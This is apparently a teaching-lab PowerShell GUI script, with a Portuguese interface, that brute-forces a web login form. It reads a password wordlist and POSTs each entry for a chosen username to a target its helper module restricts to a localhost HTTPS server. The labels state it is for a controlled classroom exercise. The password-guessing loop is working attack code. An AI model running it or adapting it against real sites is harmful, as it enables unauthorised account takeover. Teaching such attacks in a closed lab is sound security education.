Set-StrictMode -Version Latest

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

if ($PSVersionTable.PSVersion.Major -lt 7) {
    [void][System.Windows.Forms.MessageBox]::Show("Use o PowerShell 7 instalado pelo winget para executar esta ferramenta.", "Dependência ausente")
    exit 1
}

Import-Module (Join-Path $PSScriptRoot "LabAluno.psm1") -Force

$script:StopRequested = $false
$script:FoundPassword = ""

$form = New-Object System.Windows.Forms.Form
$form.Text = "Brute force web controlado — Atividade 01"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(900, 650)
$form.MinimumSize = New-Object System.Drawing.Size(760, 560)
$form.BackColor = [System.Drawing.Color]::WhiteSmoke

$title = New-Object System.Windows.Forms.Label
$title.Text = "Brute force web controlado"
$title.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(24, 18)
$form.Controls.Add($title)

$note = New-Object System.Windows.Forms.Label
$note.Text = "Use somente https://127.0.0.1:8443 e o usuário obtido no Wireshark."
$note.AutoSize = $true
$note.ForeColor = [System.Drawing.Color]::DarkRed
$note.Location = New-Object System.Drawing.Point(26, 52)
$form.Controls.Add($note)

$targetLabel = New-Object System.Windows.Forms.Label
$targetLabel.Text = "Alvo HTTPS:"
$targetLabel.AutoSize = $true
$targetLabel.Location = New-Object System.Drawing.Point(26, 92)
$form.Controls.Add($targetLabel)

$targetBox = New-Object System.Windows.Forms.TextBox
$targetBox.Text = "https://127.0.0.1:8443"
$targetBox.Location = New-Object System.Drawing.Point(130, 88)
$targetBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($targetBox)

$userLabel = New-Object System.Windows.Forms.Label
$userLabel.Text = "Usuário:"
$userLabel.AutoSize = $true
$userLabel.Location = New-Object System.Drawing.Point(26, 130)
$form.Controls.Add($userLabel)

$userBox = New-Object System.Windows.Forms.TextBox
$userBox.Location = New-Object System.Drawing.Point(130, 126)
$userBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($userBox)

$wordlistLabel = New-Object System.Windows.Forms.Label
$wordlistLabel.Text = "Wordlist:"
$wordlistLabel.AutoSize = $true
$wordlistLabel.Location = New-Object System.Drawing.Point(26, 168)
$form.Controls.Add($wordlistLabel)

$wordlistBox = New-Object System.Windows.Forms.TextBox
$wordlistBox.Text = Join-Path $PSScriptRoot "wordlist-web.txt"
$wordlistBox.Location = New-Object System.Drawing.Point(130, 164)
$wordlistBox.Size = New-Object System.Drawing.Size(585, 24)
$form.Controls.Add($wordlistBox)

$browseButton = New-Object System.Windows.Forms.Button
$browseButton.Text = "Selecionar..."
$browseButton.Location = New-Object System.Drawing.Point(730, 162)
$browseButton.Size = New-Object System.Drawing.Size(120, 28)
$form.Controls.Add($browseButton)

$startButton = New-Object System.Windows.Forms.Button
$startButton.Text = "Iniciar teste"
$startButton.Location = New-Object System.Drawing.Point(130, 204)
$startButton.Size = New-Object System.Drawing.Size(145, 32)
$form.Controls.Add($startButton)

$stopButton = New-Object System.Windows.Forms.Button
$stopButton.Text = "Parar"
$stopButton.Enabled = $false
$stopButton.Location = New-Object System.Drawing.Point(285, 204)
$stopButton.Size = New-Object System.Drawing.Size(100, 32)
$form.Controls.Add($stopButton)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Aguardando dados."
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(410, 212)
$form.Controls.Add($statusLabel)

$output = New-Object System.Windows.Forms.RichTextBox
$output.ReadOnly = $true
$output.BackColor = [System.Drawing.Color]::White
$output.Font = New-Object System.Drawing.Font("Consolas", 10)
$output.Location = New-Object System.Drawing.Point(24, 252)
$output.Size = New-Object System.Drawing.Size(826, 330)
$output.Anchor = [System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Bottom -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right
$form.Controls.Add($output)

$footer = New-Object System.Windows.Forms.Label
$footer.Text = "A ferramenta não aceita alvos fora do localhost e não envia dados para serviços externos."
$footer.AutoSize = $true
$footer.Location = New-Object System.Drawing.Point(26, 602)
$footer.Anchor = [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Bottom
$form.Controls.Add($footer)

function Set-WebOutput {
    param([string]$Text)
    $output.Text = $Text
    $output.SelectionStart = 0
    $output.ScrollToCaret()
}

function Test-WebCredential {
    param(
        [System.Uri]$Target,
        [string]$Username,
        [string]$Password
    )

    try {
        $response = Invoke-WebRequest `
            -Uri ([System.Uri]::new($Target, "/login")) `
            -Method Post `
            -Body @{ username = $Username; password = $Password } `
            -ContentType "application/x-www-form-urlencoded" `
            -SkipCertificateCheck `
            -TimeoutSec 5 `
            -ErrorAction Stop

        return ([string]$response.Content -match "LOGIN_OK")
    }
    catch {
        return $false
    }
}

function Start-WebBruteForce {
    $script:StopRequested = $false
    $script:FoundPassword = ""

    try {
        $target = Resolve-LabHttpsTarget -BaseUrl $targetBox.Text.Trim()
        $username = $userBox.Text.Trim()
        if ([string]::IsNullOrWhiteSpace($username)) {
            throw "Informe o nome de usuário obtido no Wireshark."
        }
        if (-not (Test-Path -LiteralPath $wordlistBox.Text.Trim())) {
            throw "A wordlist selecionada não existe."
        }

        $candidates = @(Get-Content -LiteralPath $wordlistBox.Text.Trim() | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" })
        if ($candidates.Count -eq 0) {
            throw "A wordlist está vazia."
        }
        if ($candidates.Count -gt 90000) {
            throw "Para manter o escopo da aula, use uma wordlist com no máximo 90.000 entradas."
        }

        $startButton.Enabled = $false
        $stopButton.Enabled = $true
        $output.Clear()
        $statusLabel.Text = "Testando $($candidates.Count) candidatos..."
        $attempt = 0

        foreach ($candidate in $candidates) {
            if ($script:StopRequested) {
                break
            }
            $attempt++
            $isValid = Test-WebCredential -Target $target -Username $username -Password $candidate
            if ($isValid) {
                $script:FoundPassword = $candidate
                $statusLabel.Text = "Senha encontrada na tentativa $attempt."
                Set-WebOutput -Text ((@(
                    "RESULTADO: LOGIN_OK"
                    "Alvo: $target"
                    "Usuário: $username"
                    "Senha encontrada: $candidate"
                    "Tentativas: $attempt de $($candidates.Count)"
                    ""
                    "Próximo passo: faça login no navegador e baixe o ZIP criptografado."
                )) -join "`r`n")
                return
            }

            if (($attempt % 500) -eq 0) {
                $statusLabel.Text = "Tentativa $attempt de $($candidates.Count)..."
                [System.Windows.Forms.Application]::DoEvents()
            }
        }

        if ($script:StopRequested) {
            $statusLabel.Text = "Teste interrompido."
            Set-WebOutput -Text "O teste foi interrompido pelo aluno após $attempt tentativa(s)."
        }
        else {
            $statusLabel.Text = "Senha não encontrada."
            Set-WebOutput -Text "Nenhum candidato produziu LOGIN_OK após $attempt tentativa(s). Verifique usuário, alvo e wordlist."
        }
    }
    catch {
        $statusLabel.Text = "Erro de validação."
        Set-WebOutput -Text "Falha controlada:`r`n$($_.Exception.Message)"
    }
    finally {
        $startButton.Enabled = $true
        $stopButton.Enabled = $false
    }
}

$browseButton.Add_Click({
    $dialog = New-Object System.Windows.Forms.OpenFileDialog
    $dialog.Filter = "Listas de texto (*.txt)|*.txt|Todos os arquivos (*.*)|*.*"
    $dialog.InitialDirectory = $PSScriptRoot
    if ($dialog.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
        $wordlistBox.Text = $dialog.FileName
    }
})

$startButton.Add_Click({ Start-WebBruteForce })
$stopButton.Add_Click({ $script:StopRequested = $true })

$form.Add_Shown({ $targetBox.Focus() })
[void]$form.ShowDialog()
